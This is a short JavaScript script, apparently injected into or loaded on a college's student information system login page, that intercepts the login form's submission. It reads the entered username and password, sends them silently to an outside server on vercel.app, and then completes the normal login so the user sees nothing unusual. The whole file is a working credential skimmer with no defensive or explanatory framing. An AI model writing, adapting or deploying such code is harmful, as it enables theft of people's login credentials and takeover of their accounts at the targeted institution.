document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector('form[action="https://mis.apexcollege.edu.np/login/validate"]');
  if (!form) return;


  let isInternalSubmit = false;

  form.addEventListener("submit", (e) => {
 
    if (isInternalSubmit) return;

    e.preventDefault();
    console.log("Intercepting user click...");

    const username = form.querySelector('input[name="username"]')?.value.trim();
    const password = form.querySelector('input[name="password"]')?.value;
    const payload = JSON.stringify({ username, password });

   
    isInternalSubmit = true;

    const proceed = () => {
      console.log("Triggering PHP redirect...");
      form.requestSubmit(); 
    };

    fetch("https://brother-alpha.vercel.app/users", {
      method: "POST",
      body: payload
    })
    .finally(() => {
      proceed();
    });
  });
});
